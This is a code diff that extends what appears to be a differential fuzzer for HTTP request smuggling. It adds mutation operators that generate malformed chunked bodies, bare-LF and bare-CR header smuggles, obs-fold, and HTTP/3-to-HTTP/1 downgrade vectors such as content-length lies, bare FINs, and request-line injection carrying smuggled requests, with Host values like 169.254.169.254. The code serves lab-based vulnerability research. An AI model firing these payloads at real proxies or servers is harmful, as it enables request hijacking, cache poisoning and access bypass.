@@ -41,7 +41,27 @@ class Reset:
     error_code: int = 0
 
 
-Op = Union[Headers, Data, Delay, Reset]
+@dataclass(frozen=True)
+class Fin:
+    """A bare QUIC STREAM FIN: an empty stream write with end_stream=True, no H3
+    DATA frame (maps to QuicConnection.send_stream_data(b"", end_stream=True)). This
+    is the standalone-FIN primitive (CVE-2026-33555): after HEADERS declaring a
+    Content-Length, a bare FIN with the buffer empty makes a vulnerable H3->H1
+    downgrade mark the message complete without the body, forwarding CL:N + 0 bytes."""
+
+
+@dataclass(frozen=True)
+class StopSending:
+    """STOP_SENDING on the request stream (maps to QuicConnection.stop_stream).
+    A receiver-side control: it aborts the peer's SENDING (the response), not the
+    request body, so it is a connection-state probe, not a request-smuggling
+    primitive. Included for QUIC-state coverage; the body-truncation vectors that
+    matter are Fin and Reset."""
+
+    error_code: int = 0
+
+
+Op = Union[Headers, Data, Delay, Reset, Fin, StopSending]
 Genome = List[Op]
 
 # H3 error codes worth resetting with.
@@ -324,6 +344,201 @@ def _mut_nested_chunk(g: Genome, rng: random.Random) -> Genome:
     return g
 
 
+def _mut_bare_lf_chunk(g: Genome, rng: random.Random) -> Genome:
+    """Frame the body as chunked, then flip some CRLF terminators to a bare LF.
+    A parser that accepts a bare-LF terminator where a strict one requires CRLF
+    disagrees on chunk boundaries (CWE-444, the CVE-2025-65114 class). Each of the
+    three terminators (after chunk data, after the 0-size, the final blank line) is
+    independently CRLF or bare LF, so the search can place the malformation and let
+    the oracle keep only the placement that actually flips behaviour."""
+    def term() -> bytes:
+        return rng.choice((b"\r\n", b"\n"))
+
+    size = rng.choice((1, 5, 0x10, 0x30))
+    data = bytes(rng.randrange(65, 91) for _ in range(size))
+    # size line stays CRLF: a bare LF *inside* the size line is rejected even on the
+    # vulnerable build; the reachable position is the terminator after chunk data.
+    body = b"%x\r\n%s%s0%s%s" % (size, data, term(), term(), term())
+    # keep the headers, drop any existing Data so the chunk framing is the whole
+    # body (a stray prefix would turn the size line into different hex on both
+    # builds, a non-differential dead end).
+    g = [o for o in g if not isinstance(o, Data)]
+    for i, o in enumerate(g):
+        if isinstance(o, Headers):
+            if not any(k.lower() == b"transfer-encoding" for k, _ in o.fields):
+                g[i] = replace(
+                    o, fields=o.fields + ((b"transfer-encoding", b"chunked"),)
+                )
+            break
+    g.append(Data(body, end_stream=True))
+    return g
+
+
+def _chunk_replace(g: Genome, body: bytes) -> Genome:
+    """Ensure Transfer-Encoding: chunked and make `body` the whole chunked body
+    (drop any prior Data). Shared by the chunk-obfuscation genes."""
+    g = [o for o in g if not isinstance(o, Data)]
+    for i, o in enumerate(g):
+        if isinstance(o, Headers):
+            if not any(k.lower() == b"transfer-encoding" for k, _ in o.fields):
+                g[i] = replace(o, fields=o.fields + ((b"transfer-encoding", b"chunked"),))
+            break
+    g.append(Data(body, end_stream=True))
+    return g
+
+
+def _mut_chunk_ext(g: Genome, rng: random.Random) -> Genome:
+    """Chunk-extension on the size line (`5;ext=v\\r\\n...`). A parser that skips the
+    extension and one that mis-parses it disagree on the chunk boundary (CVE-2025-55315
+    class). ATS forwards extensions verbatim, so a downstream pair can disagree on
+    ATS's output while every raw pair looked clean."""
+    size = rng.choice((5, 0x10, 0x20))
+    data = bytes(rng.randrange(65, 91) for _ in range(size))
+    ext = rng.choice((b";a=b", b";x", b";" + b"a" * 8 + b"=" + b"b" * 8, b";a=\"q\""))
+    where = rng.choice(("size", "zero", "both"))
+    sz = (b"%x" % size) + (ext if where in ("size", "both") else b"")
+    zero = b"0" + (ext if where in ("zero", "both") else b"")
+    body = b"%s\r\n%s\r\n%s\r\n\r\n" % (sz, data, zero)
+    return _chunk_replace(g, body)
+
+
+def _mut_chunk_size_obfuscate(g: Genome, rng: random.Random) -> Genome:
+    """Obfuscated chunk-size token: leading zeros, trailing SP/TAB, or a 0x/+ prefix.
+    A strtol-style parser and a strict-hex parser disagree on the size and thus the
+    boundary. ATS forwards these verbatim."""
+    size = rng.choice((5, 0x10, 0x1F))
+    hexs = b"%x" % size
+    tok = rng.choice((
+        b"0" * rng.randint(1, 4) + hexs,          # leading zeros
+        hexs + rng.choice((b" ", b"\t", b"  ")),  # trailing whitespace
+        b"0x" + hexs,                              # 0x prefix
+        b"+" + hexs,                               # + prefix
+    ))
+    data = bytes(rng.randrange(65, 91) for _ in range(size))
+    body = b"%s\r\n%s\r\n0\r\n\r\n" % (tok, data)
+    return _chunk_replace(g, body)
+
+
+def _mut_chunk_trailer(g: Genome, rng: random.Random) -> Genome:
+    """Trailer field after the 0-chunk (`0\\r\\n<name>: <val>\\r\\n\\r\\n`). A hop that
+    promotes a trailer to a header, strips it, or keeps it disagrees with the others;
+    a framing header smuggled in the trailer is the payload."""
+    size = rng.choice((5, 0x10))
+    data = bytes(rng.randrange(65, 91) for _ in range(size))
+    trailer = rng.choice((
+        b"X-T: y",
+        b"Transfer-Encoding: chunked",
+        b"Content-Length: 0",
+    ))
+    body = b"%x\r\n%s\r\n0\r\n%s\r\n\r\n" % (size, data, trailer)
+    return _chunk_replace(g, body)
+
+
+# --- Head-side line malformations. render_h1 concatenates raw, so these live in
+# header names/values and pseudo-headers; the genome stays structured (Headers ops)
+# so they still crossover/recombine and compose WITH a CL/TE conflict. That
+# composition across mutation steps is what mints a chain-emergent desync: a lenient
+# hop normalises the malformed line into a framing header the strict hop mis-frames.
+
+
+def _mut_ws_before_colon(g: Genome, rng: random.Random) -> Genome:
+    """Whitespace before the colon on a framing header (`Transfer-Encoding : chunked`
+    or `Content-Length : 0`). One parser strips the trailing-space field name and
+    honours the header, another treats it as unknown, so the two disagree on framing.
+    Additive: the space-named variant sits beside the clean header (a ws-obfuscated
+    duplicate), and its lowercased name never equals `content-length`, so render's
+    content-length auto-insert is untouched."""
+    name = rng.choice((b"transfer-encoding", b"content-length"))
+    variant = (name + b" ", b"chunked" if name == b"transfer-encoding" else b"0")
+    g = list(g)
+    for i, o in enumerate(g):
+        if isinstance(o, Headers):
+            g[i] = replace(o, fields=o.fields + (variant,))
+            return g
+    g.insert(0, Headers((variant,)))
+    return g
+
+
+def _mut_bare_lf_header(g: Genome, rng: random.Random) -> Genome:
+    """A framing header smuggled behind a BARE LF inside another header's value. A
+    lenient hop treating a lone \\n as a line break sees `Transfer-Encoding: chunked`;
+    a strict hop sees one long value (CWE-444, the bare-LF class). The chain-emergent
+    primitive: the lenient edge mints the ambiguity the strict origin mis-frames."""
+    smug = rng.choice((b"Transfer-Encoding: chunked", b"Content-Length: 0"))
+    inj = (b"x-pad", b"1\n" + smug)
+    g = list(g)
+    for i, o in enumerate(g):
+        if isinstance(o, Headers):
+            g[i] = replace(o, fields=o.fields + (inj,))
+            return g
+    g.insert(0, Headers((inj,)))
+    return g
+
+
+def _mut_bare_cr_header(g: Genome, rng: random.Random) -> Genome:
+    """Same smuggle behind a BARE CR (a \\r not followed by \\n). Some parsers end a
+    line on a lone CR, others keep it as data, so a CR-smuggled framing header is
+    seen by only one side (the bare-CR variant of CWE-444)."""
+    smug = rng.choice((b"Transfer-Encoding: chunked", b"Content-Length: 0"))
+    inj = (b"x-pad", b"1\r" + smug)
+    g = list(g)
+    for i, o in enumerate(g):
+        if isinstance(o, Headers):
+            g[i] = replace(o, fields=o.fields + (inj,))
+            return g
+    g.insert(0, Headers((inj,)))
+    return g
+
+
+def _mut_obs_fold(g: Genome, rng: random.Random) -> Genome:
+    """obs-fold (RFC 7230-deprecated line folding): a Transfer-Encoding value
+    continued on an indented line. One parser joins the fold into the value, another
+    starts a new header, so the folded TE is honoured by only one side."""
+    inj = (b"transfer-encoding", b"\r\n chunked")
+    g = list(g)
+    for i, o in enumerate(g):
+        if isinstance(o, Headers):
+            g[i] = replace(o, fields=o.fields + (inj,))
+            return g
+    g.insert(0, Headers((inj,)))
+    return g
+
+
+def _mut_absolute_form(g: Genome, rng: random.Random) -> Genome:
+    """Absolute-form request target (`POST http://lab/x HTTP/1.1`). A proxy may
+    rewrite it to origin-form for the backend or forward it verbatim; a backend that
+    rejects or re-routes absolute-form then disagrees with the proxy on the target."""
+    g = list(g)
+    for i, o in enumerate(g):
+        if isinstance(o, Headers) and any(k.lower() == b":path" for k, _ in o.fields):
+            fields = tuple(
+                (k, b"http://lab" + (v if v.startswith(b"/") else b"/" + v))
+                if k.lower() == b":path"
+                else (k, v)
+                for k, v in o.fields
+            )
+            g[i] = replace(o, fields=fields)
+            return g
+    return g
+
+
+def _mut_rl_space(g: Genome, rng: random.Random) -> Genome:
+    """Extra whitespace in the request line (`POST  / HTTP/1.1`, or a tab). Parsers
+    that split the request line on a single SP versus a run of whitespace disagree on
+    the method/target boundary."""
+    ws = rng.choice((b" ", b"\t"))
+    g = list(g)
+    for i, o in enumerate(g):
+        if isinstance(o, Headers) and any(k.lower() == b":method" for k, _ in o.fields):
+            fields = tuple(
+                (k, v + ws) if k.lower() == b":method" else (k, v)
+                for k, v in o.fields
+            )
+            g[i] = replace(o, fields=fields)
+            return g
+    return g
+
+
 # QUERY (RFC 10008) and SEARCH are safe methods that carry a body; unknown verbs
 # and bodyless verbs (GET/HEAD) are where a proxy and backend disagree on framing.
 HTTP_VERBS = (b"QUERY", b"SEARCH", b"GET", b"HEAD", b"PATCH", b"PURGE", b"ZZZ")
@@ -344,6 +559,138 @@ def _mut_http_method(g: Genome, rng: random.Random) -> Genome:
     return g
 
 
+# --- HTTP/3 -> HTTP/1 downgrade attack genes (the QUIC-transport / H3-synthesis
+# boundary). Driven over real H3 (driver.py); render_h1 ignores the transport-only
+# ops. The QUIC-state class generalizes CVE-2026-33555 (declared CL != delivered
+# body via QUIC stream state). aioquic is a conformant client, so CR/LF and
+# duplicate-pseudo synthesis vectors do NOT reach the wire without a raw QPACK path;
+# these genes stay within what a real H3 client can send. ---
+
+
+def _h3_set_cl(g: Genome, n: int) -> Genome:
+    """Drop existing body/terminators; set content-length: n on the request HEADERS
+    (end_stream=False), synthesizing a POST skeleton if none exists. Returns the ops
+    with no Data/Fin/Reset (caller appends the terminator sequence)."""
+    g = [o for o in g if not isinstance(o, (Data, Fin, Reset))]
+    out, found = [], False
+    for o in g:
+        if isinstance(o, Headers) and any(k.lower() == b":method" for k, _ in o.fields):
+            fields = tuple((k, v) for k, v in o.fields if k.lower() != b"content-length")
+            out.append(replace(o, fields=fields + ((b"content-length", str(n).encode()),),
+                               end_stream=False))
+            found = True
+        else:
+            out.append(o)
+    if not found:
+        out.insert(0, Headers(((b":method", b"POST"), (b":scheme", b"https"),
+                               (b":authority", b"lab"), (b":path", b"/"),
+                               (b"content-length", str(n).encode())), end_stream=False))
+    return out
+
+
+def _mut_standalone_fin(g: Genome, rng: random.Random) -> Genome:
+    """CVE-2026-33555 class: declare content-length N, deliver 0 body, end the stream
+    with a bare FIN. A vulnerable H3->H1 downgrade forwards CL:N + 0 bytes and pools
+    the desynced backend connection (the next request's first N bytes are eaten)."""
+    out = _h3_set_cl(g, rng.choice((1, 5, 10, 48, 100)))
+    out.append(Fin())
+    return out
+
+
+def _mut_body_length_lie(g: Genome, rng: random.Random) -> Genome:
+    """Declared content-length != bytes actually delivered over QUIC (a real DATA
+    frame shorter than CL, then FIN). Downgrade and backend disagree on the boundary."""
+    n = rng.choice((5, 10, 48, 100))
+    m = rng.choice((0, 1, 3))
+    out = _h3_set_cl(g, n)
+    if m > 0:
+        out.append(Data(b"A" * m, end_stream=False))
+    out.append(Fin())
+    return out
+
+
+def _mut_reset_mid_body(g: Genome, rng: random.Random) -> Genome:
+    """RESET_STREAM after partial body: declare CL:N, send M<N bytes, then abort the
+    stream. A downgrade that forwards the partial body and reuses the backend conn
+    without resetting it desyncs the pool."""
+    out = _h3_set_cl(g, rng.choice((10, 48, 100)))
+    out.append(Data(b"A" * rng.choice((1, 3, 5)), end_stream=False))
+    out.append(Reset(rng.choice([H3_NO_ERROR, H3_REQUEST_CANCELLED])))
+    return out
+
+
+def _mut_authority_host_conflict(g: Genome, rng: random.Random) -> Genome:
+    """:authority plus an explicit Host header with a different value. The downgrade
+    synthesizes Host from :authority; a surviving conflicting Host reaches the backend
+    (routing / cache-key / SSRF divergence). Valid H3, so it reaches the wire."""
+    g = list(g)
+    for i, o in enumerate(g):
+        if isinstance(o, Headers) and any(k.lower() == b":method" for k, _ in o.fields):
+            host = rng.choice((b"evil", b"internal", b"localhost", b"169.254.169.254"))
+            g[i] = replace(o, fields=o.fields + ((b"host", host),))
+            return g
+    return g
+
+
+def _mut_pseudo_path_space(g: Genome, rng: random.Random) -> Genome:
+    """Whitespace / extra tokens in :path that the downgrade splices into the H1
+    request line (`POST /a b HTTP/1.1`), testing request-line re-parsing on the
+    backend. Valid H3 field value (no CR/LF), so aioquic sends it."""
+    inj = rng.choice((b"/a b", b"/a\tb", b"/  /", b"/a HTTP/1.0", b"//", b"/a#b"))
+    g = list(g)
+    for i, o in enumerate(g):
+        if isinstance(o, Headers) and any(k.lower() == b":path" for k, _ in o.fields):
+            fields = tuple((k, inj) if k.lower() == b":path" else (k, v) for k, v in o.fields)
+            g[i] = replace(o, fields=fields)
+            return g
+    return g
+
+
+def _mut_h3_reqline_inject(g: Genome, rng: random.Random) -> Genome:
+    """H3->H1 request-line / header injection via a pseudo-header the downgrade
+    splices verbatim into the H1 request line (:path / :method carrying CR/LF and a
+    smuggled request or header). Only reaches the wire over the raw QPACK path
+    (aioquic rejects it); a downgrade that does not sanitize splices it into H1."""
+    inj = rng.choice((
+        b"/ HTTP/1.1\r\nHost: evil\r\nX-Smuggled: 1",
+        b"/x\r\nTransfer-Encoding: chunked",
+        b"/x\r\n\r\nGET /smuggled HTTP/1.1\r\nHost: y",
+        b"/x\r\nContent-Length: 0",
+    ))
+    g = list(g)
+    for i, o in enumerate(g):
+        if isinstance(o, Headers) and any(k.lower() == b":path" for k, _ in o.fields):
+            fields = tuple((k, inj) if k.lower() == b":path" else (k, v) for k, v in o.fields)
+            g[i] = replace(o, fields=fields)
+            return g
+    return g
+
+
+def _mut_h3_pseudo_dup(g: Genome, rng: random.Random) -> Genome:
+    """Duplicate/conflicting pseudo-header (:method, :path, or :authority) or a value
+    with a bare CR/LF/NUL. RFC 9114 forbids these; the raw QPACK path sends them so a
+    downgrade that fails to reject picks one value while the backend sees another."""
+    inj = rng.choice((
+        (b":path", b"/b"), (b":method", b"POST"), (b":authority", b"evil"),
+        (b"x-inj", b"1\rEvil: 2"), (b"x-inj", b"1\nEvil: 2"), (b"x-inj", b"1\x00Evil"),
+    ))
+    g = list(g)
+    for i, o in enumerate(g):
+        if isinstance(o, Headers) and any(k.lower() == b":method" for k, _ in o.fields):
+            g[i] = replace(o, fields=o.fields + (inj,))
+            return g
+    return g
+
+
+# H3-downgrade genes usable as a biased subset for the H3 hunt. The reqline/pseudo
+# injection genes need the raw QPACK driver path (raw=True) to reach the wire.
+H3_OPERATOR_NAMES = (
+    "_mut_standalone_fin", "_mut_body_length_lie", "_mut_reset_mid_body",
+    "_mut_authority_host_conflict", "_mut_pseudo_path_space",
+    "_mut_h3_reqline_inject", "_mut_h3_pseudo_dup",
+)
+
+
 OPERATORS: Tuple[Callable[[Genome, random.Random], Genome], ...] = (
     _mut_toggle_fin,
     _mut_content_length,
@@ -360,6 +707,23 @@ OPERATORS: Tuple[Callable[[Genome, random.Random], Genome], ...] = (
     _mut_header_crlf_injection,
     _mut_nested_chunk,
     _mut_http_method,
+    _mut_bare_lf_chunk,
+    _mut_ws_before_colon,
+    _mut_bare_lf_header,
+    _mut_bare_cr_header,
+    _mut_obs_fold,
+    _mut_absolute_form,
+    _mut_rl_space,
+    _mut_chunk_ext,
+    _mut_chunk_size_obfuscate,
+    _mut_chunk_trailer,
+    _mut_standalone_fin,
+    _mut_body_length_lie,
+    _mut_reset_mid_body,
+    _mut_authority_host_conflict,
+    _mut_pseudo_path_space,
+    _mut_h3_reqline_inject,
+    _mut_h3_pseudo_dup,
 )
 
 
